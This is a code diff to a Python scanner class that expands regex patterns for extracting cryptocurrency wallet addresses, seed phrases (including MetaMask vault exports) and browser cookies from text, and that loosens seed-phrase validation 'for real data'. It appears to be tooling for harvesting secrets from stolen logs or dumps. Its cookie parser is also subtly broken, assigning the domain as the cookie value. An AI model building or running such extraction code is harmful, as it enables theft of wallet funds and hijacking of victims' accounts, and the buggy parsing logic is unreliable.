@@ -33,17 +33,21 @@ class UltraAdvancedScanner:
         self.crypto_utils = crypto_utils
         self.db = db
         
-        # Ultra-comprehensive wallet address patterns
+        # MAXIMUM wallet patterns - ALL NETWORKS + Extensions
         self.wallet_patterns = {
+            'BTC': [
+                r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b',  # Legacy
+                r'\bbc1[a-z0-9]{39,59}\b',  # Bech32/SegWit
+                r'\b3[a-km-zA-HJ-NP-Z1-9]{25,34}\b',  # P2SH
+                r'bitcoin.*?([13][a-km-zA-HJ-NP-Z1-9]{25,34})',
+            ],
             'ETH': [
                 r'0x[a-fA-F0-9]{40}',
-                r'"address"\s*:\s*"(0x[a-fA-F0-9]{40})"',
                 r'ethereum.*?(0x[a-fA-F0-9]{40})',
             ],
-            'BTC': [
-                r'\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}\b',
-                r'bitcoin.*?([13][a-km-zA-HJ-NP-Z1-9]{25,34})',
-                r'btc.*?([13][a-km-zA-HJ-NP-Z1-9]{25,34})',
+            'BSC': [  # Binance Smart Chain (separate from BNB)
+                r'0x[a-fA-F0-9]{40}',
+                r'bsc.*?(0x[a-fA-F0-9]{40})',
             ],
             'TRX': [
                 r'T[A-Za-z1-9]{33}',
@@ -55,40 +59,89 @@ class UltraAdvancedScanner:
             ],
             'LTC': [
                 r'[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}',
+                r'ltc1[a-z0-9]{39,59}',  # Bech32
                 r'litecoin.*?([LM3][a-km-zA-HJ-NP-Z1-9]{26,33})',
             ],
             'DOGE': [
                 r'D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}',
+                r'doge.*?(D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32})',
             ],
-            'BNB': [
+            'BNB': [  # Binance Chain
                 r'bnb[a-zA-Z0-9]{39}',
-                r'0x[a-fA-F0-9]{40}',  # BSC uses ETH format
+                r'binance.*?(bnb[a-zA-Z0-9]{39})',
             ],
             'XRP': [
                 r'r[0-9a-zA-Z]{24,34}',
+                r'ripple.*?(r[0-9a-zA-Z]{24,34})',
+            ],
+            'ADA': [  # Cardano
+                r'addr1[a-z0-9]{58}',
+                r'DdzFF[a-zA-Z0-9]{93}',
+                r'cardano.*?(addr1[a-z0-9]{58})',
+            ],
+            'DOT': [  # Polkadot
+                r'1[a-zA-Z0-9]{47}',
+                r'polkadot.*?(1[a-zA-Z0-9]{47})',
+            ],
+            'MATIC': [  # Polygon
+                r'0x[a-fA-F0-9]{40}',
+                r'polygon.*?(0x[a-fA-F0-9]{40})',
+            ],
+            'AVAX': [  # Avalanche
+                r'X-avax1[a-z0-9]{38}',
+                r'P-avax1[a-z0-9]{38}',
+                r'C-0x[a-fA-F0-9]{40}',
+            ],
+            'ATOM': [  # Cosmos
+                r'cosmos1[a-z0-9]{38}',
+            ],
+            'NEAR': [  # NEAR Protocol
+                r'[a-z0-9\-_]{2,64}\.near',
+            ],
+            'TON': [  # TON
+                r'[EU]Q[a-zA-Z0-9\-_]{46}',
+            ],
+            'BCH': [  # Bitcoin Cash
+                r'bitcoincash:q[a-z0-9]{41}',
+                r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}',
+            ],
+            'XMR': [  # Monero
+                r'4[0-9AB][a-zA-Z0-9]{93}',
+            ],
+            'ALGO': [  # Algorand
+                r'[A-Z2-7]{58}',
             ],
         }
         
         # ULTRA-AGGRESSIVE seed phrase patterns
         self.seed_patterns = [
-            # Standard formats
+            # Standard formats - 12/15/18/21/24 words
             r'\b([a-z]{3,8}(?:\s+[a-z]{3,8}){11})\b',  # 12 words
+            r'\b([a-z]{3,8}(?:\s+[a-z]{3,8}){14})\b',  # 15 words
+            r'\b([a-z]{3,8}(?:\s+[a-z]{3,8}){17})\b',  # 18 words
+            r'\b([a-z]{3,8}(?:\s+[a-z]{3,8}){20})\b',  # 21 words
             r'\b([a-z]{3,8}(?:\s+[a-z]{3,8}){23})\b',  # 24 words
             
-            # With labels
-            r'(?:seed|mnemonic|phrase|words|recovery)[\s\:=]+([a-z]{3,8}(?:\s+[a-z]{3,8}){11,23})',
+            # With labels and various separators
+            r'(?:seed|mnemonic|phrase|words|recovery|backup)[\s\:\=\-\>]+([a-z]{3,8}(?:\s+[a-z]{3,8}){11,23})',
+            r'(?:12|15|18|21|24)\s*words?[\s\:\=\-\>]+([a-z]{3,8}(?:\s+[a-z]{3,8}){11,23})',
             
-            # JSON format
-            r'"(?:seed|mnemonic)"[\s\:]+\[?"([a-z]{3,8}(?:\s+[a-z]{3,8}){11,23})"?\]?',
-            
-            # Numbered format (1. word 2. word...)
-            r'(?:1[\.\)]\s*)?([a-z]{3,8})(?:\s+(?:2[\.\)]\s*)?([a-z]{3,8})){11,23}',
+            # JSON/Object format
+            r'"(?:seed|mnemonic|seedPhrase|mnemonicPhrase)"[\s\:]+\[?"([a-z]{3,8}(?:\s+[a-z]{3,8}){11,23})"?\]?',
+            r'"(?:seed|mnemonic)"[\s\:]+\[((?:"[a-z]{3,8}",?\s*){12,24})\]',
             
             # Comma separated
             r'([a-z]{3,8}(?:,\s*[a-z]{3,8}){11,23})',
             
-            # Line by line in logs
+            # With numbers (1. word 2. word or 1) word 2) word)
+            r'(?:1[\.\):\-]\s*)?([a-z]{3,8})(?:\s+(?:\d+[\.\):\-]\s*)?([a-z]{3,8})){11,23}',
+            
+            # Multiline format
             r'(?m)^([a-z]{3,8})\s*$(?:\n^([a-z]{3,8})\s*$){11,23}',
+            
+            # MetaMask/Wallet app exports
+            r'(?:mnemonic|seed)[\s\:]*\{[^\}]*"phrase"[\s\:]*"([^"]{50,300})"',
+            r'vault.*?"mnemonic"[\s\:]*"([a-z\s]{50,300})"',
         ]
         
         # Private key patterns - ALL FORMATS
@@ -409,9 +462,9 @@ class UltraAdvancedScanner:
     def _validate_and_filter_seed(self, seed_candidate: str) -> bool:
         """
         Smart validation and filtering of seed phrases
-        Removes fake/test/duplicate seeds
+        Removes fake/test/duplicate seeds but less strict for real data
         """
-        if not seed_candidate or len(seed_candidate) < 50:
+        if not seed_candidate or len(seed_candidate) < 40:  # Reduced from 50
             return False
         
         # Clean and normalize
@@ -425,33 +478,46 @@ class UltraAdvancedScanner:
         if word_count not in [12, 15, 18, 21, 24]:
             return False
         
-        # Check for test/fake patterns
+        # Check for obvious test/fake patterns
         fake_patterns = [
-            r'test\s+test',
-            r'example\s+example',
-            r'demo\s+demo',
-            r'sample\s+sample',
-            r'(word\s+){3,}',  # "word word word word..."
-            r'(fake\s+){2,}',
-            r'(invalid\s+){2,}',
+            r'test\s+test\s+test',  # Made more specific
+            r'example\s+example\s+example',
+            r'demo\s+demo\s+demo',
+            r'(word\s+){5,}',  # Must be 5+ repetitions
+            r'(fake\s+){3,}',
+            r'(invalid\s+){3,}',
+            r'(sample\s+){3,}',
         ]
         
         for pattern in fake_patterns:
             if re.search(pattern, cleaned):
                 return False
         
-        # Check for repeated words (more than 50%)
+        # Check for repeated words (more lenient - allow up to 60%)
         unique_words = set(words)
-        if len(unique_words) < word_count * 0.5:
+        if len(unique_words) < word_count * 0.4:  # Reduced from 0.5
             return False
         
-        # Must have word variety (not all same word)
+        # Must have word variety (at least 3 unique words)
         if len(unique_words) < 3:
             return False
         
-        # Validate against BIP39 wordlist
-        if not self.crypto_utils.validate_seed_phrase(cleaned):
-            return False
+        # Check word lengths (BIP39 words are 3-8 letters)
+        for word in words:
+            if len(word) < 3 or len(word) > 8:
+                return False
+        
+        # Optional: Try BIP39 validation but don't fail if it doesn't work
+        try:
+            if not self.crypto_utils.validate_seed_phrase(cleaned):
+                # If BIP39 validation fails, check if most words look valid
+                # Count words that look like they could be BIP39 words
+                valid_looking = sum(1 for w in words if 3 <= len(w) <= 8 and w.isalpha())
+                if valid_looking < word_count * 0.8:  # At least 80% look valid
+                    return False
+        except:
+            # If validation throws error, allow it if words look reasonable
+            pass
         
         return True
     
@@ -734,33 +800,64 @@ class UltraAdvancedScanner:
         return mail_accounts
     
     def extract_cookies(self, content: str) -> List[Dict]:
-        """Extract browser cookies"""
+        """Extract browser cookies with enhanced patterns"""
         cookies = []
+        seen = set()
         
-        # Cookie patterns
+        # Enhanced cookie patterns
         cookie_patterns = [
-            r'Set-Cookie:\s*([^=]+)=([^;]+)',
+            # Set-Cookie headers
+            r'Set-Cookie:\s*([^=]+)=([^;]+)(?:.*?Domain=([^;]+))?',
+            # Cookie headers
             r'Cookie:\s*([^=]+)=([^;]+)',
+            # JSON format
             r'"cookie":\s*"([^"]+)"',
-            r'document\.cookie\s*=\s*["\']([^"\']+)["\']',
+            r'"name":\s*"([^"]+)"[^}]*"value":\s*"([^"]+)"',
+            # JavaScript cookies
+            r'document\.cookie\s*=\s*["\']([^=]+)=([^"\']+)["\']',
+            # Browser extension format
+            r'"domain":\s*"([^"]+)"[^}]*"name":\s*"([^"]+)"[^}]*"value":\s*"([^"]+)"',
         ]
         
         for pattern in cookie_patterns:
             try:
-                matches = re.findall(pattern, content, re.IGNORECASE)
+                matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
                 for match in matches:
                     if isinstance(match, tuple):
-                        if len(match) >= 2:
-                            cookies.append({
+                        if len(match) >= 3 and match[2]:  # Has domain
+                            cookie = {
+                                'domain': match[2].strip(),
+                                'name': match[1].strip() if len(match) > 1 else match[0].strip(),
+                                'value': match[2].strip() if len(match) <= 2 else match[2].strip()
+                            }
+                        elif len(match) >= 2:  # Name and value
+                            cookie = {
+                                'domain': 'unknown',
                                 'name': match[0].strip(),
                                 'value': match[1].strip()
-                            })
+                            }
+                        else:  # Single value
+                            cookie = {
+                                'domain': 'unknown',
+                                'name': 'cookie',
+                                'value': match[0].strip() if match[0] else str(match)
+                            }
+                        
+                        # Check for duplicates
+                        cookie_key = f"{cookie.get('name')}:{cookie.get('value')[:50]}"
+                        if cookie_key not in seen and len(cookie.get('value', '')) > 5:
+                            seen.add(cookie_key)
+                            cookies.append(cookie)
                     else:
-                        cookies.append({
-                            'raw': match.strip()
-                        })
+                        # Single match (full cookie string)
+                        if len(str(match)) > 10:
+                            cookies.append({
+                                'domain': 'unknown',
+                                'name': 'cookie',
+                                'value': str(match).strip()
+                            })
             except:
                 continue
         
-        return cookies[:100]  # Limit to 100 cookies
+        return cookies[:100]  # Limit to 100 cookies per file
 
